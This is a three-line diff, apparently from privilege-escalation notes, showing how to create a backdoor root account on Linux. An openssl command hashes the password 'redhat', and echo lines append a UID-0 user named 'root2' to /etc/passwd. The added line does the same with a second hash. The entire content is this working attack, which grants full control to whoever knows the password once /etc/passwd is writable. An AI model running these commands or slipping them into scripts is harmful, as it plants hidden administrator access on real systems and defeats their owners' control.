@@ -1,2 +1,3 @@
 openssl passwd -1 -salt Etg2ExUZ redhat    => $1$Etg2ExUZ$F9NTP7omafhKIlqaBMqng1
 echo 'root2:$1$Etg2ExUZ$F9NTP7omafhKIlqaBMqng1:0:0:root:/root:/bin/bash' >> /etc/passwd
+echo 'root2:mwIYDnuCYwIZw:0:0:root:/root:/bin/bash' >> /etc/passwd
